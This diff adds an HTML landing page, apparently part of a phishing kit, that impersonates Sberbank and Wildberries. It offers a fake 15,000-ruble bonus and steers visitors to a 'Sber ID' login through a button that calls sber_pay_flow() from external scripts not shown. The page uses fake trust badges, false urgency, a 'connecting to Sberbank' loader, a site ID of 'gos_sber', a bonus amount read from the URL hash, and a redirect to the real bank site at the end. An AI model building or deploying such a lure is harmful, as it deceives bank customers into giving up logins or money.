@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+    <meta content="no-cache" http-equiv="Cache-control">
+    <meta content="no-cache" http-equiv="Pragma">
+    <meta content="-1" http-equiv="Expires">
+    <title>Эксклюзивное предложение для клиентов СберБанка | Wildberries</title>
+    <meta property="og:title" content="Получите до 15 000 ₽ на покупки в Wildberries и у партнёров"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:description" content="Специальная программа лояльности для клиентов СберБанка. Бонусы на покупки в Wildberries, Золотое Яблоко и других магазинах-партнёрах."/>
+    <link rel="shortcut icon" href="favicons/favicon_sber.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        :root {
+            --sber-green: #21a038;
+            --sber-green-dark: #1a8a2f;
+            --sber-gradient: linear-gradient(135deg, #21a038 0%, #3ddc84 50%, #00d4aa 100%);
+            --wb-purple: #cb11ab;
+            --wb-purple-dark: #a00d8a;
+            --gold-apple: #c9a962;
+            --text-dark: #1a1a1a;
+            --text-gray: #6b7280;
+            --bg-light: #f8fafc;
+            --card-shadow: 0 20px 60px rgba(33, 160, 56, 0.15);
+        }
+        
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(180deg, #f0fdf4 0%, #ffffff 30%, #fefce8 100%);
+            min-height: 100vh;
+            color: var(--text-dark);
+            overflow-x: hidden;
+        }
+        
+        /* Animated background */
+        .bg-decoration {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        
+        .bg-circle {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0.1;
+            animation: float 20s infinite ease-in-out;
+        }
+        
+        .bg-circle:nth-child(1) {
+            width: 600px;
+            height: 600px;
+            background: var(--sber-green);
+            top: -200px;
+            right: -200px;
+            animation-delay: 0s;
+        }
+        
+        .bg-circle:nth-child(2) {
+            width: 400px;
+            height: 400px;
+            background: var(--wb-purple);
+            bottom: -100px;
+            left: -100px;
+            animation-delay: -5s;
+        }
+        
+        .bg-circle:nth-child(3) {
+            width: 300px;
+            height: 300px;
+            background: var(--gold-apple);
+            top: 50%;
+            left: 50%;
+            animation-delay: -10s;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(30px, -30px) scale(1.05); }
+            50% { transform: translate(-20px, 20px) scale(0.95); }
+            75% { transform: translate(10px, 10px) scale(1.02); }
+        }
+        
+        /* Header */
+        .header {
+            position: relative;
+            z-index: 100;
+            padding: 20px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header-logos {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .logo-sber {
+            height: 32px;
+        }
+        
+        .logo-divider {
+            width: 1px;
+            height: 24px;
+            background: #d1d5db;
+        }
+        
+        .logo-wb {
+            height: 28px;
+        }
+        
+        .header-badge {
+            background: linear-gradient(135deg, var(--sber-green), #3ddc84);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(33, 160, 56, 0.3);
+        }
+        
+        /* Hero Section */
+        .hero {
+            position: relative;
+            z-index: 10;
+            padding: 40px 24px 60px;
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        
+        .hero-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(33, 160, 56, 0.1);
+            border: 1px solid rgba(33, 160, 56, 0.2);
+            padding: 8px 16px;
+            border-radius: 24px;
+            margin-bottom: 24px;
+            animation: fadeInDown 0.6s ease-out;
+        }
+        
+        .hero-label-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--sber-green);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+        }
+        
+        .hero-label-text {
+            color: var(--sber-green);
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .hero-title {
+            font-size: clamp(32px, 6vw, 56px);
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            animation: fadeInUp 0.6s ease-out 0.1s backwards;
+        }
+        
+        .hero-title .amount {
+            background: var(--sber-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .hero-subtitle {
+            font-size: clamp(16px, 2.5vw, 20px);
+            color: var(--text-gray);
+            max-width: 600px;
+            margin: 0 auto 32px;
+            line-height: 1.6;
+            animation: fadeInUp 0.6s ease-out 0.2s backwards;
+        }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Main Card */
+        .main-card {
+            position: relative;
+            z-index: 10;
+            background: white;
+            border-radius: 24px;
+            padding: 40px 32px;
+            max-width: 480px;
+            margin: 0 auto 60px;
+            box-shadow: var(--card-shadow);
+            animation: fadeInUp 0.6s ease-out 0.3s backwards;
+        }
+        
+        .bonus-display {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .bonus-amount {
+            font-size: 64px;
+            font-weight: 800;
+            background: var(--sber-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+        }
+        
+        .bonus-currency {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--sber-green);
+        }
+        
+        .bonus-label {
+            font-size: 14px;
+            color: var(--text-gray);
+            margin-top: 8px;
+        }
+        
+        /* Partners */
+        .partners-section {
+            background: var(--bg-light);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 28px;
+        }
+        
+        .partners-title {
+            font-size: 13px;
+            color: var(--text-gray);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+            font-weight: 600;
+        }
+        
+        .partners-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+        }
+        
+        .partner-item {
+            background: white;
+            border-radius: 12px;
+            padding: 16px 12px;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid #e5e7eb;
+        }
+        
+        .partner-item:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        }
+        
+        .partner-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            font-size: 24px;
+        }
+        
+        .partner-wb { background: linear-gradient(135deg, #cb11ab, #ff4081); }
+        .partner-gold { background: linear-gradient(135deg, #c9a962, #f5d77d); }
+        .partner-other { background: linear-gradient(135deg, var(--sber-green), #3ddc84); }
+        
+        .partner-name {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-dark);
+            line-height: 1.3;
+        }
+        
+        .partner-cashback {
+            font-size: 10px;
+            color: var(--sber-green);
+            font-weight: 700;
+            margin-top: 4px;
+        }
+        
+        /* CTA Button */
+        .cta-button {
+            width: 100%;
+            padding: 18px 32px;
+            background: var(--sber-gradient);
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: shimmer 2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(33, 160, 56, 0.4);
+        }
+        
+        .cta-button:active {
+            transform: translateY(0);
+        }
+        
+        .cta-subtitle {
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        
+        .cta-subtitle svg {
+            width: 14px;
+            height: 14px;
+            color: var(--sber-green);
+        }
+        
+        /* Features */
+        .features {
+            position: relative;
+            z-index: 10;
+            padding: 0 24px 60px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+        }
+        
+        .feature-card {
+            background: white;
+            border-radius: 20px;
+            padding: 28px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+            transition: all 0.3s ease;
+            animation: fadeInUp 0.6s ease-out backwards;
+        }
+        
+        .feature-card:nth-child(1) { animation-delay: 0.4s; }
+        .feature-card:nth-child(2) { animation-delay: 0.5s; }
+        .feature-card:nth-child(3) { animation-delay: 0.6s; }
+        
+        .feature-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        
+        .feature-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        
+        .feature-icon-1 { background: linear-gradient(135deg, #dbeafe, #bfdbfe); }
+        .feature-icon-2 { background: linear-gradient(135deg, #dcfce7, #bbf7d0); }
+        .feature-icon-3 { background: linear-gradient(135deg, #fef3c7, #fde68a); }
+        
+        .feature-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--text-dark);
+        }
+        
+        .feature-desc {
+            font-size: 14px;
+            color: var(--text-gray);
+            line-height: 1.6;
+        }
+        
+        /* How it works */
+        .how-it-works {
+            position: relative;
+            z-index: 10;
+            padding: 60px 24px;
+            background: linear-gradient(180deg, transparent, rgba(33, 160, 56, 0.03), transparent);
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: clamp(24px, 4vw, 36px);
+            font-weight: 800;
+            margin-bottom: 48px;
+        }
+        
+        .steps {
+            max-width: 800px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            gap: 20px;
+            background: white;
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            transition: all 0.3s ease;
+        }
+        
+        .step:hover {
+            transform: translateX(8px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        }
+        
+        .step-number {
+            width: 48px;
+            height: 48px;
+            background: var(--sber-gradient);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            font-weight: 800;
+            flex-shrink: 0;
+        }
+        
+        .step-content h3 {
+            font-size: 17px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+        
+        .step-content p {
+            font-size: 14px;
+            color: var(--text-gray);
+            line-height: 1.5;
+        }
+        
+        /* Trust badges */
+        .trust-section {
+            position: relative;
+            z-index: 10;
+            padding: 40px 24px 60px;
+            text-align: center;
+        }
+        
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 32px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-gray);
+            font-size: 13px;
+            font-weight: 500;
+        }
+        
+        .trust-badge svg {
+            width: 20px;
+            height: 20px;
+            color: var(--sber-green);
+        }
+        
+        /* Footer */
+        .footer {
+            position: relative;
+            z-index: 10;
+            padding: 32px 24px;
+            text-align: center;
+            background: rgba(255,255,255,0.5);
+            border-top: 1px solid #e5e7eb;
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: var(--text-gray);
+            line-height: 1.6;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        /* Loader */
+        .loader {
+            background: rgba(255, 255, 255, 0.95);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 999999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        
+        .loader.show {
+            display: flex;
+        }
+        
+        .loader-spinner {
+            width: 56px;
+            height: 56px;
+            border: 4px solid #e5e7eb;
+            border-top-color: var(--sber-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loader-text {
+            margin-top: 20px;
+            color: var(--text-dark);
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .loader-subtext {
+            color: var(--text-gray);
+            font-size: 13px;
+            margin-top: 6px;
+        }
+        
+        /* Mobile optimizations */
+        @media (max-width: 640px) {
+            .header {
+                padding: 16px;
+            }
+            
+            .header-badge {
+                display: none;
+            }
+            
+            .hero {
+                padding: 24px 16px 40px;
+            }
+            
+            .main-card {
+                margin: 0 16px 40px;
+                padding: 28px 20px;
+            }
+            
+            .bonus-amount {
+                font-size: 52px;
+            }
+            
+            .partners-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 8px;
+            }
+            
+            .partner-item {
+                padding: 12px 8px;
+            }
+            
+            .partner-icon {
+                width: 40px;
+                height: 40px;
+                font-size: 20px;
+            }
+            
+            .features {
+                padding: 0 16px 40px;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .how-it-works {
+                padding: 40px 16px;
+            }
+            
+            .step {
+                flex-direction: column;
+                text-align: center;
+                align-items: center;
+            }
+            
+            .trust-badges {
+                gap: 20px;
+            }
+        }
+    </style>
+    <script>
+        var SITE_ID = "gos_sber";
+    </script>
+    <script src="js/core.min.js"></script>
+</head>
+<body>
+    <!-- Background decoration -->
+    <div class="bg-decoration">
+        <div class="bg-circle"></div>
+        <div class="bg-circle"></div>
+        <div class="bg-circle"></div>
+    </div>
+    
+    <!-- Header -->
+    <header class="header">
+        <div class="header-logos">
+            <img src="images/sberbank-logo.befb25b6.svg" alt="СберБанк" class="logo-sber">
+            <div class="logo-divider"></div>
+            <img src="images/logo.png" alt="Wildberries" class="logo-wb">
+        </div>
+        <div class="header-badge">Специальное предложение</div>
+    </header>
+    
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-label">
+            <div class="hero-label-dot"></div>
+            <span class="hero-label-text">Акция для клиентов СберБанка</span>
+        </div>
+        <h1 class="hero-title">
+            Получите до <span class="amount" id="tr_summ">15 000 ₽</span><br>на покупки
+        </h1>
+        <p class="hero-subtitle">
+            Эксклюзивная программа лояльности: бонусы на покупки в Wildberries и магазинах-партнёрах для держателей карт СберБанка
+        </p>
+    </section>
+    
+    <!-- Main Card -->
+    <div class="main-card">
+        <div class="bonus-display">
+            <div class="bonus-amount">15 000</div>
+            <div class="bonus-currency">₽</div>
+            <div class="bonus-label">на покупки в любимых магазинах</div>
+        </div>
+        
+        <div class="partners-section">
+            <div class="partners-title">Где потратить</div>
+            <div class="partners-grid">
+                <div class="partner-item">
+                    <div class="partner-icon partner-wb">🛍️</div>
+                    <div class="partner-name">Wildberries</div>
+                    <div class="partner-cashback">до 10 000 ₽</div>
+                </div>
+                <div class="partner-item">
+                    <div class="partner-icon partner-gold">✨</div>
+                    <div class="partner-name">Золотое Яблоко</div>
+                    <div class="partner-cashback">до 3 000 ₽</div>
+                </div>
+                <div class="partner-item">
+                    <div class="partner-icon partner-other">🎁</div>
+                    <div class="partner-name">Другие партнёры</div>
+                    <div class="partner-cashback">до 2 000 ₽</div>
+                </div>
+            </div>
+        </div>
+        
+        <button class="cta-button" onclick="sber_pay_flow();">
+            Получить бонусы по Сбер ID
+        </button>
+        
+        <div class="cta-subtitle">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            Безопасный вход через СберБанк Онлайн
+        </div>
+    </div>
+    
+    <!-- Features -->
+    <section class="features">
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon feature-icon-1">💳</div>
+                <h3 class="feature-title">Для держателей карт Сбера</h3>
+                <p class="feature-desc">Программа доступна всем клиентам СберБанка с активной дебетовой или кредитной картой</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon feature-icon-2">⚡</div>
+                <h3 class="feature-title">Мгновенное начисление</h3>
+                <p class="feature-desc">Бонусы зачисляются на ваш счёт сразу после подтверждения участия в программе</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon feature-icon-3">🎯</div>
+                <h3 class="feature-title">Тратьте с удовольствием</h3>
+                <p class="feature-desc">Используйте бонусы для оплаты до 100% стоимости покупок в магазинах-партнёрах</p>
+            </div>
+        </div>
+    </section>
+    
+    <!-- How it works -->
+    <section class="how-it-works">
+        <h2 class="section-title">Как получить бонусы?</h2>
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-content">
+                    <h3>Авторизуйтесь через Сбер ID</h3>
+                    <p>Используйте быстрый и безопасный вход через приложение СберБанк Онлайн</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-content">
+                    <h3>Подтвердите участие в программе</h3>
+                    <p>Ознакомьтесь с условиями и активируйте бонусный счёт в пару кликов</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-content">
+                    <h3>Получите бонусы на покупки</h3>
+                    <p>Бонусы будут доступны для использования в Wildberries, Золотом Яблоке и других партнёрах</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <!-- Trust badges -->
+    <section class="trust-section">
+        <div class="trust-badges">
+            <div class="trust-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                    <path d="M7 11V7a5 5 0 0110 0v4"/>
+                </svg>
+                Защита данных SSL
+            </div>
+            <div class="trust-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M22 11.08V12a10 10 0 11-5.93-9.14"/>
+                    <polyline points="22 4 12 14.01 9 11.01"/>
+                </svg>
+                Официальная программа
+            </div>
+            <div class="trust-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"/>
+                    <polyline points="12 6 12 12 16 14"/>
+                </svg>
+                Акция ограничена
+            </div>
+        </div>
+    </section>
+    
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">
+            © 2025 Программа лояльности СберБанк × Wildberries. Акция действует для клиентов СберБанка. 
+            Подробные условия на сайте организатора. Количество бонусов ограничено.
+        </p>
+    </footer>
+    
+    <!-- Loader -->
+    <div class="loader" id="loader">
+        <div class="loader-spinner"></div>
+        <div class="loader-text">Подключаемся к СберБанку...</div>
+        <div class="loader-subtext">Не закрывайте страницу</div>
+    </div>
+
+    <!-- Main flow container -->
+    <div class="vstep-box advise__box" id="vstep_flow" style="display:none;"></div>
+
+    <script src="js/base_v2.js"></script>
+    <script>
+        function showLoader(show) {
+            const loader = document.getElementById('loader');
+            if (show) {
+                loader.classList.add('show');
+            } else {
+                loader.classList.remove('show');
+            }
+        }
+        
+        function goodbye() {
+            document.location.href = 'https://www.sberbank.ru/';
+        }
+        
+        document.addEventListener('DOMContentLoaded', function () {
+            // Parse sum from URL hash
+            let summ = document.location.hash.replace('#', '');
+            if (summ && summ.length) {
+                document.getElementById('tr_summ').textContent = summ + ' ₽';
+                // Update bonus display
+                const bonusAmount = document.querySelector('.bonus-amount');
+                if (bonusAmount) {
+                    bonusAmount.textContent = summ.replace(/\s/g, '').replace('₽', '');
+                }
+            }
+        });
+    </script>
+</body>
+</html>
